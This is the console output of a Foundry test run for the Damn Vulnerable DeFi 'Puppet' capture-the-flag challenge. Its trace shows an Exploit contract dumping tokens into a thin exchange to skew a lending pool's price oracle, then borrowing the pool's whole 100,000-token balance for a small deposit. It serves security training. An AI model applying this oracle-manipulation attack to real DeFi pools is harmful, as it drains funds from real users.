 forge test --match-path CurvyPuppet.t.sol -vvvv 
[⠊] Compiling...
[⠊] Compiling 1 files with Solc 0.8.25
[⠒] Solc 0.8.25 finished in 886.22ms
Compiler run successful!

Ran 2 tests for test/curvy-puppet/CurvyPuppet.t.sol:PuppetChallenge
[PASS] test_assertInitialState() (gas: 49224)
Traces:
  [49224] PuppetChallenge::test_assertInitialState()
    ├─ [0] VM::assertEq(25000000000000000000 [2.5e19], 25000000000000000000 [2.5e19]) [staticcall]
    │   └─ ← [Return]
    ├─ [6160] 0xF0C36E5Bf7a10DeBaE095410c8b1A6E9501DC0f7::factoryAddress()
    │   ├─ [3093] 0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b::factoryAddress() [delegatecall]
    │   │   └─ ← [Return] 0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264
    │   └─ ← [Return] 0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264
    ├─ [0] VM::assertEq(0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264, 0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264) [staticcall]
    │   └─ ← [Return]
    ├─ [3631] 0xF0C36E5Bf7a10DeBaE095410c8b1A6E9501DC0f7::tokenAddress()
    │   ├─ [3064] 0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b::tokenAddress() [delegatecall]
    │   │   └─ ← [Return] DamnValuableToken: [0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5]
    │   └─ ← [Return] DamnValuableToken: [0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5]
    ├─ [0] VM::assertEq(DamnValuableToken: [0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5], DamnValuableToken: [0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5]) [staticcall]
    │   └─ ← [Return]
    ├─ [8126] 0xF0C36E5Bf7a10DeBaE095410c8b1A6E9501DC0f7::getTokenToEthInputPrice(1000000000000000000 [1e18])
    │   ├─ [7556] 0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b::getTokenToEthInputPrice(1000000000000000000 [1e18]) [delegatecall]
    │   │   ├─ [2516] DamnValuableToken::balanceOf(0xF0C36E5Bf7a10DeBaE095410c8b1A6E9501DC0f7) [staticcall]
    │   │   │   └─ ← [Return] 10000000000000000000 [1e19]
    │   │   └─ ← [Return] 906610893880149131 [9.066e17]
    │   └─ ← [Return] 906610893880149131 [9.066e17]
    ├─ [0] VM::assertEq(906610893880149131 [9.066e17], 906610893880149131 [9.066e17]) [staticcall]
    │   └─ ← [Return]
    ├─ [1740] PuppetPool::calculateDepositRequired(1000000000000000000 [1e18]) [staticcall]
    │   ├─ [516] DamnValuableToken::balanceOf(0xF0C36E5Bf7a10DeBaE095410c8b1A6E9501DC0f7) [staticcall]
    │   │   └─ ← [Return] 10000000000000000000 [1e19]
    │   └─ ← [Return] 2000000000000000000 [2e18]
    ├─ [0] VM::assertEq(2000000000000000000 [2e18], 2000000000000000000 [2e18]) [staticcall]
    │   └─ ← [Return]
    ├─ [1740] PuppetPool::calculateDepositRequired(100000000000000000000000 [1e23]) [staticcall]
    │   ├─ [516] DamnValuableToken::balanceOf(0xF0C36E5Bf7a10DeBaE095410c8b1A6E9501DC0f7) [staticcall]
    │   │   └─ ← [Return] 10000000000000000000 [1e19]
    │   └─ ← [Return] 200000000000000000000000 [2e23]
    ├─ [0] VM::assertEq(200000000000000000000000 [2e23], 200000000000000000000000 [2e23]) [staticcall]
    │   └─ ← [Return]
    └─ ← [Stop]

[PASS] test_puppet() (gas: 524797)
Logs:
  before calculateDepositRequired(amount) 200000000000000000000000
  1010000000000000000000
  after calculateDepositRequired(amount) 19664329888798200000

Traces:
  [576997] PuppetChallenge::test_puppet()
    ├─ [0] VM::startPrank(player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C], player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C])
    │   └─ ← [Return]
    ├─ [348760] → new Exploit@0xce110ab5927CC46905460D930CCa0c6fB4666219
    │   └─ ← [Return] 1297 bytes of code
    ├─ [29670] DamnValuableToken::transfer(Exploit: [0xce110ab5927CC46905460D930CCa0c6fB4666219], 1000000000000000000000 [1e21])
    │   ├─ emit Transfer(from: player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C], to: Exploit: [0xce110ab5927CC46905460D930CCa0c6fB4666219], amount: 1000000000000000000000 [1e21])
    │   └─ ← [Return] true
    ├─ [143663] Exploit::attack(100000000000000000000000 [1e23])
    │   ├─ [516] DamnValuableToken::balanceOf(Exploit: [0xce110ab5927CC46905460D930CCa0c6fB4666219]) [staticcall]
    │   │   └─ ← [Return] 1000000000000000000000 [1e21]
    │   ├─ [24520] DamnValuableToken::approve(0xF0C36E5Bf7a10DeBaE095410c8b1A6E9501DC0f7, 1000000000000000000000 [1e21])
    │   │   ├─ emit Approval(owner: Exploit: [0xce110ab5927CC46905460D930CCa0c6fB4666219], spender: 0xF0C36E5Bf7a10DeBaE095410c8b1A6E9501DC0f7, amount: 1000000000000000000000 [1e21])
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   ├─ [6240] PuppetPool::calculateDepositRequired(100000000000000000000000 [1e23]) [staticcall]
    │   │   ├─ [2516] DamnValuableToken::balanceOf(0xF0C36E5Bf7a10DeBaE095410c8b1A6E9501DC0f7) [staticcall]
    │   │   │   └─ ← [Return] 10000000000000000000 [1e19]
    │   │   └─ ← [Return] 200000000000000000000000 [2e23]
    │   ├─ [0] console::log("before calculateDepositRequired(amount)", 200000000000000000000000 [2e23]) [staticcall]
    │   │   └─ ← [Stop]
    │   ├─ [24161] 0xF0C36E5Bf7a10DeBaE095410c8b1A6E9501DC0f7::tokenToEthTransferInput(1000000000000000000000 [1e21], 1, 1, Exploit: [0xce110ab5927CC46905460D930CCa0c6fB4666219])
    │   │   ├─ [21082] 0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b::tokenToEthTransferInput(1000000000000000000000 [1e21], 1, 1, Exploit: [0xce110ab5927CC46905460D930CCa0c6fB4666219]) [delegatecall]
    │   │   │   ├─ [516] DamnValuableToken::balanceOf(0xF0C36E5Bf7a10DeBaE095410c8b1A6E9501DC0f7) [staticcall]
    │   │   │   │   └─ ← [Return] 10000000000000000000 [1e19]
    │   │   │   ├─ [55] Exploit::receive{value: 9900695134061569016}()
    │   │   │   │   └─ ← [Stop]
    │   │   │   ├─ [6520] DamnValuableToken::transferFrom(Exploit: [0xce110ab5927CC46905460D930CCa0c6fB4666219], 0xF0C36E5Bf7a10DeBaE095410c8b1A6E9501DC0f7, 1000000000000000000000 [1e21])
    │   │   │   │   ├─ emit Transfer(from: Exploit: [0xce110ab5927CC46905460D930CCa0c6fB4666219], to: 0xF0C36E5Bf7a10DeBaE095410c8b1A6E9501DC0f7, amount: 1000000000000000000000 [1e21])
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   ├─ emit EthPurchase(buyer: Exploit: [0xce110ab5927CC46905460D930CCa0c6fB4666219], tokens_sold: 1000000000000000000000 [1e21], eth_bought: 9900695134061569016 [9.9e18])
    │   │   │   └─ ← [Return] 9900695134061569016 [9.9e18]
    │   │   └─ ← [Return] 9900695134061569016 [9.9e18]
    │   ├─ [516] DamnValuableToken::balanceOf(0xF0C36E5Bf7a10DeBaE095410c8b1A6E9501DC0f7) [staticcall]
    │   │   └─ ← [Return] 1010000000000000000000 [1.01e21]
    │   ├─ [0] console::log(1010000000000000000000 [1.01e21]) [staticcall]
    │   │   └─ ← [Stop]
    │   ├─ [1740] PuppetPool::calculateDepositRequired(100000000000000000000000 [1e23]) [staticcall]
    │   │   ├─ [516] DamnValuableToken::balanceOf(0xF0C36E5Bf7a10DeBaE095410c8b1A6E9501DC0f7) [staticcall]
    │   │   │   └─ ← [Return] 1010000000000000000000 [1.01e21]
    │   │   └─ ← [Return] 19664329888798200000 [1.966e19]
    │   ├─ [0] console::log("after calculateDepositRequired(amount)", 19664329888798200000 [1.966e19]) [staticcall]
    │   │   └─ ← [Stop]
    │   ├─ [68357] PuppetPool::borrow{value: 20000000000000000000}(100000000000000000000000 [1e23], recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa])
    │   │   ├─ [516] DamnValuableToken::balanceOf(0xF0C36E5Bf7a10DeBaE095410c8b1A6E9501DC0f7) [staticcall]
    │   │   │   └─ ← [Return] 1010000000000000000000 [1.01e21]
    │   │   ├─ [55] Exploit::receive{value: 335670111201800000}()
    │   │   │   └─ ← [Stop]
    │   │   ├─ [29670] DamnValuableToken::transfer(recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa], 100000000000000000000000 [1e23])
    │   │   │   ├─ emit Transfer(from: PuppetPool: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50], to: recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa], amount: 100000000000000000000000 [1e23])
    │   │   │   └─ ← [Return] true
    │   │   ├─ emit Borrowed(account: Exploit: [0xce110ab5927CC46905460D930CCa0c6fB4666219], recipient: recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa], depositRequired: 19664329888798200000 [1.966e19], borrowAmount: 100000000000000000000000 [1e23])
    │   │   └─ ← [Stop]
    │   └─ ← [Stop]
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return]
    ├─ [0] VM::getNonce(player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C]) [staticcall]
    │   └─ ← [Return] 1
    ├─ [0] VM::assertEq(1, 1, "Player executed more than one tx") [staticcall]
    │   └─ ← [Return]
    ├─ [516] DamnValuableToken::balanceOf(PuppetPool: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] VM::assertEq(0, 0, "Pool still has tokens") [staticcall]
    │   └─ ← [Return]
    ├─ [516] DamnValuableToken::balanceOf(recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa]) [staticcall]
    │   └─ ← [Return] 100000000000000000000000 [1e23]
    ├─ [0] VM::assertGe(100000000000000000000000 [1e23], 100000000000000000000000 [1e23], "Not enough tokens in recovery account") [staticcall]
    │   └─ ← [Return]
    └─ ← [Stop]

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 6.95ms (1.67ms CPU time)

Ran 1 test suite in 12.81ms (6.95ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
